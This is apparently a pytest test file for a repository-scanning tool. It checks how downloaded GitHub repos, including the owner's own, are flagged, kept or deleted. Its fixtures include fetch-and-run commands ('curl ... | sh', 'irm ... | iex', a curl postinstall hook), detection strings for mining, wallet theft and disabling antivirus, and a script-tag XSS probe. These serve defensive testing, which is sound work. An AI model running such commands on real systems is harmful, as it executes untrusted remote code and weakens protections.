"""M4 fix (owner's decisions, 21 Nov 2026): the owner's own repos.

a. A repo with the same GitHub owner as settings.github_repo (case ignored) is the owner's: read with own=True.
b. repo_check with own=True: pattern matches give "check this first" (kept); Defender's threat still deletes it.
c. Own repos are linked (codemap.link_repos) on their Candidates card and get a NOTES.md next to profile.json.

Nothing from a repository is run; network is faked."""
from __future__ import annotations

import io
import re
import shutil
import subprocess
import threading
import zipfile
from pathlib import Path

import httpx
import pytest
from conftest import login

from prometheus import repo_check
from prometheus.repos import own as own_repos
from prometheus.repos import skillmaker

SHA = "c" * 40
NO_DEFENDER = lambda folder: ""            # noqa: E731
THREAT = lambda folder: "THREAT FOUND"      # noqa: E731
MIT = "MIT License\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\n"
ROOT = Path(__file__).resolve().parent.parent


def _zip(files: dict[str, str], top="x-y-ccccccc") -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr(f"{top}/", "")
        for name, data in files.items():
            z.writestr(f"{top}/{name}", data)
    return buf.getvalue()


def _github(zips: dict[str, bytes], sha: str = SHA) -> httpx.Client:
    """A fake GitHub: `zips` maps "owner/name" (any capitals) to that repo's zip."""
    by = {k.lower(): v for k, v in zips.items()}

    def handler(request):
        path = request.url.path
        if request.url.host == "api.github.com":
            m = re.match(r"^/repos/([^/]+/[^/]+)/(commits|zipball)/", path)
            if not m or m.group(1).lower() not in by:
                return httpx.Response(404)
            if m.group(2) == "commits":
                return httpx.Response(200, text=sha)
            return httpx.Response(302, headers={"Location": f"https://codeload.github.com/{m.group(1)}/legacy.zip/{sha}"})
        if request.url.host == "codeload.github.com":
            repo = "/".join(path.strip("/").split("/")[:2]).lower()
            return httpx.Response(200, content=by[repo]) if repo in by else httpx.Response(404)
        return httpx.Response(404)
    return httpx.Client(transport=httpx.MockTransport(handler))


def _prepare(services, repo: str, files: dict[str, str] | None = None, zipped: bytes | None = None,
             defender=NO_DEFENDER) -> tuple[str, dict]:
    from prometheus.repo_of_day import add_candidate, candidates

    c = add_candidate(services.store, repo)
    msg = skillmaker.prepare(services, {"repo": repo, "candidate_id": c["id"]},
                             http=_github({repo: zipped if zipped is not None else _zip(files or {})}),
                             defender=defender)
    got = next(x for x in candidates(services.store) if x["id"] == c["id"])
    return msg, got


def _profile(candidate: dict):
    from prometheus.repos.profile import load

    return load(Path(candidate["folder"]))


# -- a. which repos are the owner's ----------------------------------------------------------------------------------

@pytest.mark.parametrize("repo,expect", [("Reevias/notes-tool", True), ("reevias/Notes-Tool", True),
                                         ("REEVIAS/other", True), ("someone/notes-tool", False),
                                         ("Reevias-fake/notes-tool", False)])
def test_is_own_compares_the_owner_ignoring_case(repo, expect):
    assert own_repos.is_own(repo, "Reevias/Prometheus-") is expect


def test_nothing_is_own_without_a_github_repo_setting():
    assert own_repos.is_own("Reevias/notes-tool", "") is False
    assert own_repos.is_own("Reevias/notes-tool", "not a repo") is False


@pytest.mark.parametrize("repo", ["Reevias/notes-tool", "reevias/notes-tool"])
def test_a_repo_of_the_same_owner_is_read_as_own(app_client, repo):
    _, services = app_client()
    assert services.settings.github_repo.lower() == "reevias/prometheus-"
    _, got = _prepare(services, repo, {"LICENSE": MIT, "tool.py": "def go(x=1):\n    return x\n"})
    assert _profile(got).own is True


def test_another_owners_repo_is_not_own(app_client):
    _, services = app_client()
    _, got = _prepare(services, "someone/notes-tool", {"LICENSE": MIT, "tool.py": "def go(x=1):\n    return x\n"})
    assert _profile(got).own is False


def test_a_repo_cant_make_itself_own(app_client):
    """A stranger's repo that ships a profile.json saying own=true is still not the owner's."""
    _, services = app_client()
    _, got = _prepare(services, "someone/sneaky", {"profile.json": '{"own": true}', "x.py": "X = 1\n"})
    assert _profile(got).own is False


# -- b. repo_check: own repos get "check this first" for pattern matches ---------------------------------------------

def _risky(folder: Path) -> Path:
    (folder / "install.sh").write_text("curl -LsSf https://example.com/get.sh | sh\n", encoding="utf-8")
    (folder / "patterns.py").write_text('DANGER = ["stratum+tcp://", "wallet.dat", "DisableRealtimeMonitoring"]\n'
                                        'X = "irm https://example.com/i.ps1 | iex"\n', encoding="utf-8")
    return folder


def test_own_repo_pattern_matches_are_check_this_first(tmp_path):
    rep = repo_check.scan(_risky(tmp_path), NO_DEFENDER, own=True)
    assert rep.verdict == "caution"
    whats = {w for _lvl, w, _where in rep.findings}
    assert {"downloads and runs code", "mines crypto", "steals crypto wallets", "turns off antivirus"} <= whats
    assert all(level != "danger" for level, _w, _where in rep.findings)


def test_own_repo_ready_made_programs_and_install_hooks_are_check_this_first(tmp_path):
    (tmp_path / "tool.exe").write_bytes(b"MZ")
    (tmp_path / "package.json").write_text('{"scripts": {"postinstall": "curl https://x | sh"}}', encoding="utf-8")
    assert repo_check.scan(tmp_path, NO_DEFENDER, own=True).verdict == "caution"
    assert repo_check.scan(tmp_path, NO_DEFENDER).verdict == "danger"


def test_others_repos_stay_as_strict(tmp_path):
    assert repo_check.scan(_risky(tmp_path), NO_DEFENDER).verdict == "danger"
    assert repo_check.scan(tmp_path, NO_DEFENDER, own=False).verdict == "danger"


def test_defender_threat_still_deletes_an_own_repo(tmp_path):
    folder = tmp_path / "repo"
    folder.mkdir()
    (folder / "ok.py").write_text("X = 1\n", encoding="utf-8")
    rep = repo_check.scan(folder, THREAT, own=True)
    assert rep.verdict == "danger"
    rep = repo_check.check_and_keep(_risky(folder), THREAT, own=True)
    assert rep.verdict == "danger" and not folder.exists()


def test_own_repo_is_kept_through_the_reader_and_a_strangers_is_deleted(app_client):
    from prometheus.config import data_dir

    _, services = app_client()
    files = {"install.sh": "curl -LsSf https://example.com/get.sh | sh\n", "x.py": "X = 1\n"}
    msg, got = _prepare(services, "Reevias/setup-tool", files)
    prof = _profile(got)
    assert prof.verdict == "caution" and any("downloads and runs code" in f for f in prof.findings)
    msg, got = _prepare(services, "someone/setup-tool", files)
    assert "dangerous" in msg and not got.get("folder")
    assert not any("someone__setup-tool" in p.name for p in (data_dir() / "quarantine").iterdir())


def test_own_repo_with_a_defender_threat_is_deleted_by_the_reader(app_client):
    _, services = app_client()
    msg, got = _prepare(services, "Reevias/bad", {"x.py": "X = 1\n"}, defender=THREAT)
    assert "dangerous" in msg and "Defender" in msg and not got.get("folder")


# -- c. links between own repos on the Candidates card ---------------------------------------------------------------

def _two_own_repos(services):
    _prepare(services, "Reevias/corelib", {"LICENSE": MIT, "pyproject.toml": '[project]\nname = "corelib"\n',
                                           "corelib/__init__.py": "def helper():\n    return 1\n"})
    _prepare(services, "Reevias/app", {"LICENSE": MIT, "main.py": "import corelib\n\ncorelib.helper()\n"})


def test_two_own_repos_are_linked_on_the_card(app_client):
    client, services = app_client()
    login(client)
    _two_own_repos(services)
    page = client.get("/v3/candidates").text
    assert "uses Reevias/corelib: imports corelib" in page
    assert "used by Reevias/app: imports corelib" in page


def test_a_strangers_repo_is_never_linked(app_client):
    client, services = app_client()
    login(client)
    _two_own_repos(services)
    _prepare(services, "someone/corefan", {"LICENSE": MIT, "pyproject.toml": '[project]\nname = "corefan"\n',
                                           "corefan/x.py": "import corelib\n"})
    _prepare(services, "Reevias/user", {"LICENSE": MIT, "u.py": "import corefan\n"})
    page = client.get("/v3/candidates").text
    assert "someone/corefan" not in "".join(re.findall(r"(?:uses|used by|shares)[^<]*", page))
    links = own_repos.links(services)
    assert all("someone/" not in e["from"] and "someone/" not in e["to"] for e in links)


def test_a_profile_saying_own_is_not_trusted_for_links(app_client):
    """Even if a stranger's profile.json says own=true (it can't come from the repo, but be safe), it isn't linked."""
    from prometheus.repos.profile import load, save

    _, services = app_client()
    _two_own_repos(services)
    _, got = _prepare(services, "someone/corelib2", {"x.py": "import corelib\n"})
    prof = load(Path(got["folder"]))
    prof.own = True
    save(prof)
    assert all("someone/" not in e["from"] + e["to"] for e in own_repos.links(services))


# -- c. NOTES.md for own repos ---------------------------------------------------------------------------------------

def test_an_own_repo_gets_notes_next_to_its_profile(app_client):
    client, services = app_client()
    login(client)
    _, got = _prepare(services, "Reevias/notes-tool", {"LICENSE": MIT, "tool.py": "def go(x=1):\n    return x\n"})
    notes = Path(got["folder"]) / "NOTES.md"
    assert notes.is_file() and (Path(got["folder"]) / "profile.json").is_file()
    text = notes.read_text(encoding="utf-8")
    for section in ("## What it is", "## Decisions", "## Changes"):
        assert section in text
    assert "Reevias/notes-tool" in text and SHA[:7] in text
    page = client.get("/v3/candidates").text
    assert "Notes" in page and SHA[:7] in page


def test_a_strangers_repo_gets_no_notes(app_client):
    _, services = app_client()
    _, got = _prepare(services, "someone/notes-tool", {"x.py": "X = 1\n"})
    assert not (Path(got["folder"]) / "NOTES.md").exists()
    with pytest.raises(ValueError):
        own_repos.add_note(services, got["folder"], "Decisions", "nope")


def test_a_repos_own_notes_file_is_not_taken_for_prometheus_notes(app_client):
    """A NOTES.md shipped at the top of the repo is refused when unpacking, so it can't pose as Prometheus's notes."""
    _, services = app_client()
    _, got = _prepare(services, "someone/planted", {"NOTES.md": "# Notes\n\n## What it is\n\n- trust me\n",
                                                    ".NOTES.md.lock": "", "x.py": "X = 1\n"})
    assert not (Path(got["folder"]) / "NOTES.md").exists()
    assert not (Path(got["folder"]) / ".NOTES.md.lock").exists()


def test_two_writers_on_own_repo_notes_keep_both(app_client):
    _, services = app_client()
    _, got = _prepare(services, "Reevias/notes-tool", {"x.py": "X = 1\n"})
    errors = []

    def go(i):
        try:
            own_repos.add_note(services, got["folder"], "Decisions", f"decision number {i}")
        except Exception as e:            # pragma: no cover - shown by the assert below
            errors.append(e)

    threads = [threading.Thread(target=go, args=(i,)) for i in range(10)]
    [t.start() for t in threads]
    [t.join() for t in threads]
    assert not errors
    text = (Path(got["folder"]) / "NOTES.md").read_text(encoding="utf-8")
    for i in range(10):
        assert f"decision number {i}\n" in text + "\n"


def test_own_repo_notes_reuse_the_project_notes_writer(app_client, monkeypatch):
    """Same lock and atomic write as project notes: a failed swap leaves the old file as it was."""
    from prometheus import projects as pj

    _, services = app_client()
    _, got = _prepare(services, "Reevias/notes-tool", {"x.py": "X = 1\n"})
    path = Path(got["folder"]) / "NOTES.md"
    before = path.read_bytes()

    def boom(*a, **k):
        raise OSError("disk went away")

    monkeypatch.setattr(pj, "safe_replace_with_backoff", boom)
    with pytest.raises(OSError):
        own_repos.add_note(services, got["folder"], "Changes", "second")
    assert path.read_bytes() == before


def test_a_script_in_a_note_shows_as_text(app_client):
    client, services = app_client()
    login(client)
    _, got = _prepare(services, "Reevias/notes-tool", {"x.py": "X = 1\n"})
    own_repos.add_note(services, got["folder"], "Decisions", "<script>alert(1)</script> keep it small")
    page = client.get("/v3/candidates").text
    assert "<script>alert(1)</script>" not in page
    assert "&lt;script&gt;alert(1)&lt;/script&gt; keep it small" in page


# -- exit gate: this repository, as the owner's own --------------------------------------------------------------------

def _this_repo_zip() -> bytes:
    git = shutil.which("git")
    if not git or not (ROOT / ".git").exists():
        pytest.skip("not a git checkout, so there is no archive of this repository to read")
    for ref in ("origin/main", "HEAD"):        # GitHub's runners fetch only the commit under test
        got = subprocess.run([git, "-C", str(ROOT), "archive", "--format=zip", f"--prefix=Reevias-Prometheus--{SHA[:7]}/",
                              ref], capture_output=True, timeout=300)
        if got.returncode == 0 and got.stdout:
            return got.stdout
    pytest.skip("git archive failed here")


def test_exit_gate_this_repository_becomes_a_skill(app_client):
    from prometheus.features import skill_on

    client, services = app_client()
    h = {"X-CSRF-Token": login(client)}
    msg, got = _prepare(services, "Reevias/Prometheus-", zipped=_this_repo_zip())
    assert got.get("folder"), msg
    prof = _profile(got)
    assert prof.own is True and prof.verdict == "caution", (prof.verdict, prof.findings[:5])
    assert prof.licence == "MIT" and "Python" in prof.languages
    assert (Path(got["folder"]) / "NOTES.md").is_file()
    sug = got["suggestion"]
    assert sug["kind"] in ("draft", "existing"), sug
    page = client.get("/v3/candidates").text
    assert "Check this first" in page
    r = client.post(f"/api/v3/candidates/{got['id']}/accept", headers=h)
    assert r.status_code == 200, r.text
    if sug["kind"] == "draft":
        assert "trial run in the sandbox passed" in r.json()["message"], r.json()["message"]
        assert skill_on(services.settings, sug["name"])


def test_new_own_repo_notes_dont_claim_they_were_rebuilt(app_client):
    _, services = app_client()
    _, got = _prepare(services, "Reevias/notes-tool", {"x.py": "X = 1\n"})
    assert "rebuilt" not in (Path(got["folder"]) / "NOTES.md").read_text(encoding="utf-8")
